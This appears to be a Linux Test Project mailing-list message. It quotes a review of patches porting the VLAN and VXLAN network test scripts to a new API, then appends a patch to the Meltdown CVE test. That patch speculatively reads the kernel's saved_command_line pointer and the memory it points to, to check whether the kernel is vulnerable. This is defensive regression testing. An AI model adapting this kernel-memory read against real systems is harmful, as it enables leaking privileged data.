-> diff --git a/testcases/network/virt/vlan03.sh b/testcases/network/virt/vlan03.sh
-> index 33bfaf84c..adadd76fd 100755
-> --- a/testcases/network/virt/vlan03.sh
-> +++ b/testcases/network/virt/vlan03.sh
-> @@ -1,5 +1,6 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2015-2017 Oracle and/or its affiliates.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
-> @@ -10,20 +11,6 @@
->  # Test-case 2: The same as above but must fail, because VLAN allows
->  #              to communicate only within the same VLAN segment.
->  
-> -TCID=vlan03
-> -TST_TOTAL=6
-> -TST_NEEDS_TMPDIR=1
-> -
-> -virt_type="vlan"
-> -
-> -. virt_lib.sh
-> -
-> -TST_CLEANUP="virt_cleanup"
-> -
-> -if [ -z $ip_local -o -z $ip_remote ]; then
-> -	tst_brkm TBROK "you must specify IP address"
-> -fi
-> -
->  p0="protocol 802.1Q"
->  p1="protocol 802.1ad"
->  lb0="loose_binding off"
-> @@ -31,23 +18,38 @@ lb1="loose_binding on"
->  rh0="reorder_hdr off"
->  rh1="reorder_hdr on"
->  
-> -opts=" ,$p0 $lb0 $rh1,$p1 $lb1 $rh1"
-> +virt_type="vlan"
-> +
-> +TST_NEEDS_TMPDIR=1
-> +TST_TEST_DATA=",$p0 $lb0 $rh1,$p1 $lb1 $rh1"
-> +TST_TEST_DATA_IFS=","
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=do_setup
-> +TST_CLEANUP=virt_cleanup
-> +. virt_lib.sh
->  
-> -for n in $(seq 1 3); do
-> -	p="$(echo $opts | cut -d',' -f$n)"
-> +do_setup()
-> +{
-> +	if [ -z $ip_local -o -z $ip_remote ]; then
-> +		tst_brk TBROK "you must specify IP address"
-> +	fi
-> +	virt_lib_setup
-> +}
->  
-> -	virt_check_cmd virt_add ltp_v0 id 0 $p || continue
-> +do_test()
-> +{
-> +	virt_check_cmd virt_add ltp_v0 id 0 $2 || return
->  
-> -	tst_resm TINFO "networks with the same VLAN ID must work"
-> -	virt_setup "id 4094 $p" "id 4094 $p"
-> +	tst_res TINFO "networks with the same VLAN ID must work"
-> +	virt_setup "id 4094 $2" "id 4094 $2"
->  	virt_netperf_msg_sizes
->  	virt_cleanup_rmt
->  
-> -	tst_resm TINFO "different VLAN ID shall not work together"
-> -	virt_setup "id 4093 $p" "id 4094 $p"
-> +	tst_res TINFO "different VLAN ID shall not work together"
-> +	virt_setup "id 4093 $2" "id 4094 $2"
->  	virt_minimize_timeout
->  	virt_compare_netperf "fail"
->  	virt_cleanup_rmt
-> -done
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/vxlan01.sh b/testcases/network/virt/vxlan01.sh
-> index 49bcb942a..027fc6f45 100755
-> --- a/testcases/network/virt/vxlan01.sh
-> +++ b/testcases/network/virt/vxlan01.sh
-> @@ -1,23 +1,28 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2014-2015 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
->  # Local test, check if we can create multiple VXLAN interfaces.
->  
->  TCID=vxlan01
-> -TST_TOTAL=5
->  TST_OPTS="hi:d:"
->  TST_PARSE_ARGS=virt_lib_parse_args
-> +TST_USAGE=virt_lib_usage
->  
->  virt_type="vxlan"
->  start_id=16700000
->  
-> -. virt_lib.sh
-> -
->  options="l2miss l3miss,norsc nolearning noproxy,\
->  ttl 0x01 tos 0x01,ttl 0xff tos 0xff,gbp"
-
-TST_TEST_DATA instead?
-
-> +TST_CNT=5
-
-Is it really needed, virt_test_01 uses the 2nd argument only, right?
-
-> +TST_TESTFUNC=do_test
-
-TST_TESTFUNC=virt_test_01?
-
-> +. virt_lib.sh
->  
-> -virt_test_01 "$options"
-> +do_test()
-> +{
-> +	virt_test_01 "$options"
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/vxlan02.sh b/testcases/network/virt/vxlan02.sh
-> index dde1dabc8..24e5c4dfb 100755
-> --- a/testcases/network/virt/vxlan02.sh
-> +++ b/testcases/network/virt/vxlan02.sh
-> @@ -1,5 +1,6 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2014-2015 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
-> @@ -7,18 +8,22 @@
->  # interface 5000 times.
->  
->  TCID=vxlan02
-> -TST_TOTAL=1
->  TST_OPTS="hi:d:"
->  TST_PARSE_ARGS=virt_lib_parse_args
-> +TST_USAGE=virt_lib_usage
->  
->  virt_type="vxlan"
->  start_id=16700000
->  
-> +TST_TESTFUNC=do_test
->  . virt_lib.sh
->  
-> -[ "$TST_IPV6" ] && mult_addr="ff02::abc" || mult_addr="239.1.1.1"
-> -opt="group $mult_addr"
-> +do_test()
-> +{
-> +	local mult_addr="239.1.1.1"
-> +	[ "$TST_IPV6" ] && mult_addr="ff02::abc"
->  
-> -virt_add_delete_test "id $start_id $opt"
-> +	virt_add_delete_test "id $start_id group $mult_addr"
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/vxlan03.sh b/testcases/network/virt/vxlan03.sh
-> index d8c533cb3..521953f73 100755
-> --- a/testcases/network/virt/vxlan03.sh
-> +++ b/testcases/network/virt/vxlan03.sh
-> @@ -1,5 +1,6 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2014-2017 Oracle and/or its affiliates.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
-> @@ -11,10 +12,10 @@
->  #              to communicate only within the same VXLAN segment.
->  
->  TCID=vxlan03
-> -TST_TOTAL=4
->  TST_NEEDS_TMPDIR=1
->  TST_OPTS="hi:d:"
->  TST_PARSE_ARGS=virt_lib_parse_args
-> +TST_USAGE=virt_lib_usage
->  
->  virt_type="vxlan"
->  start_id=16700000
-> @@ -22,6 +23,11 @@ start_id=16700000
->  # Destination address, can be unicast or multicast address
->  vxlan_dst_addr="uni"
->  
-> +TST_TEST_DATA=",gbp"
-> +TST_TEST_DATA_IFS=","
-> +TST_NEEDS_TMPDIR=1
-> +TST_TESTFUNC=do_test
-> +TST_CLEANUP=virt_cleanup
->  . virt_lib.sh
->  
->  # In average cases (with small packets less then 150 bytes) VxLAN slower
-> @@ -31,30 +37,25 @@ vxlan_dst_addr="uni"
->  VIRT_PERF_THRESHOLD=${VIRT_PERF_THRESHOLD:-160}
->  [ "$VIRT_PERF_THRESHOLD" -lt 160 ] && VIRT_PERF_THRESHOLD=160
->  
-> -TST_CLEANUP="virt_cleanup"
-> -
-> -if [ -z $ip_local -o -z $ip_remote ]; then
-> -	tst_brkm TBROK "you must specify IP address"
-> -fi
-> -
-> -opts=" ,gbp"
-> -
-> -for n in $(seq 1 2); do
-> -	p="$(echo $opts | cut -d',' -f$n)"
-> +do_test()
-> +{
-> +	if [ -z $ip_local -o -z $ip_remote ]; then
-> +		tst_brk TBROK "you must specify IP address"
-> +	fi
->  
-> -	virt_check_cmd virt_add ltp_v0 id 0 $p || continue
-> +	virt_check_cmd virt_add ltp_v0 id 0 $2 || continue
->  
-> -	tst_resm TINFO "the same VNI must work"
-> +	tst_res TINFO "the same VNI must work"
->  	# VNI is 24 bits long, so max value, which is not reserved, is 0xFFFFFE
-> -	vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE $p" "id 0xFFFFFE $p"
-> +	vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE $2" "id 0xFFFFFE $2"
->  	virt_netperf_msg_sizes
->  	virt_cleanup_rmt
->  
-> -	tst_resm TINFO "different VNI shall not work together"
-> -	vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE $p" "id 0xFFFFFD $p"
-> +	tst_res TINFO "different VNI shall not work together"
-> +	vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE $2" "id 0xFFFFFD $2"
->  	virt_minimize_timeout
->  	virt_compare_netperf "fail"
->  	virt_cleanup_rmt
-> -done
-> +}
->  
-> -tst_exit
-> +tst_run
-> 
+diff --git a/testcases/cve/meltdown.c b/testcases/cve/meltdown.c
+index dce84a0c316b..a53ea9b8e533 100644
+--- a/testcases/cve/meltdown.c
++++ b/testcases/cve/meltdown.c
+@@ -189,7 +189,7 @@ readbit(int fd, unsigned long addr, char bit)
+ 	for (i = 0; i < CYCLES; i++) {
+ 		ret = pread(fd, buf, sizeof(buf), 0);
+ 		if (ret < 0)
+-			tst_res(TBROK | TERRNO, "can't read /proc/version");
++			tst_res(TBROK | TERRNO, "can't read fd");
+ 
+ 		clflush_target();
+ 
+@@ -298,17 +298,17 @@ find_kernel_symbol(const char *name)
+ 	return addr;
+ }
+ 
+-unsigned long linux_proc_banner_addr;
+-int banner_fd;
++static unsigned long saved_cmdline_addr;
++static int spec_fd;
+ 
+ static void setup(void)
+ {
+ 	set_cache_hit_threshold();
+ 
+-	linux_proc_banner_addr = find_kernel_symbol("linux_proc_banner");
+-	tst_res(TINFO, "linux_proc_banner is@%lx", linux_proc_banner_addr);
++	saved_cmdline_addr = find_kernel_symbol("saved_command_line");
++	tst_res(TINFO, "&saved_command_line == 0x%lx", saved_cmdline_addr);
+ 
+-	banner_fd = SAFE_OPEN("/proc/version", O_RDONLY);
++	spec_fd = SAFE_OPEN("/proc/cmdline", O_RDONLY);
+ 
+ 	memset(target_array, 1, sizeof(target_array));
+ 
+@@ -316,37 +316,69 @@ static void setup(void)
+ 		tst_res(TBROK | TERRNO, "set_signal");
+ }
+ 
++#define READ_SIZE 32
++
+ static void run(void)
+ {
+-	unsigned int i, score, ret;
+-	static char expected[] = "%s version %s";
+-	static char read[32];
+-	unsigned long addr = linux_proc_banner_addr;
+-	unsigned long size = sizeof(expected) - 1;
+-
++	unsigned int i, score = 0, ret;
++	unsigned long addr;
++	unsigned long size;
++	char read[READ_SIZE] = { 0 };
++	char expected[READ_SIZE] = { 0 };
++	int expected_len;
++
++	expected_len = pread(spec_fd, expected, sizeof(expected), 0);
++	if (expected_len < 0)
++		tst_res(TBROK | TERRNO, "can't read test fd");
++
++	/* read address of saved_cmdline_addr */
++	addr = saved_cmdline_addr;
++	size = sizeof(addr);
+ 	for (i = 0; i < size; i++) {
+-		ret = readbyte(banner_fd, addr);
++		ret = readbyte(spec_fd, addr);
+ 
+ 		read[i] = ret;
+-		tst_res(TINFO, "read %lx = 0x%x %c", addr, ret,
++		tst_res(TINFO, "read %lx = 0x%02x %c", addr, ret,
+ 			isprint(ret) ? ret : ' ');
+ 
+ 		addr++;
+ 	}
+ 
+-	for (score = 0, i = 0; i < size; i++)
++	/* read value pointed to by saved_cmdline_addr */
++	memcpy(&addr, read, sizeof(addr));
++	memset(read, 0, sizeof(read));
++	tst_res(TINFO, "save_command_line: 0x%lx", addr);
++	size = expected_len;
++
++	if (!addr)
++		goto done;
++
++	for (i = 0; i < size; i++) {
++		ret = readbyte(spec_fd, addr);
++
++		read[i] = ret;
++		tst_res(TINFO, "read %lx = 0x%02x %c | expected 0x%02x |"
++			" match: %d", addr, ret, isprint(ret) ? ret : ' ',
++			expected[i], read[i] == expected[i]);
++
++		addr++;
++	}
++
++	for (i = 0; i < size; i++)
+ 		if (expected[i] == read[i])
+ 			score++;
+ 
++done:
+ 	if (score > size / 2)
+ 		tst_res(TFAIL, "I was able to read your kernel memory!!!");
+ 	else
+ 		tst_res(TPASS, "I was not able to read your kernel memory");
++	tst_res(TINFO, "score(matched/all): %u / %lu", score, size);
+ }
+ 
+ static void cleanup(void)
+ {
+-	SAFE_CLOSE(banner_fd);
++	SAFE_CLOSE(spec_fd);
+ }
+ 
+ static struct tst_test test = {
+-- 
+1.8.3.1
 
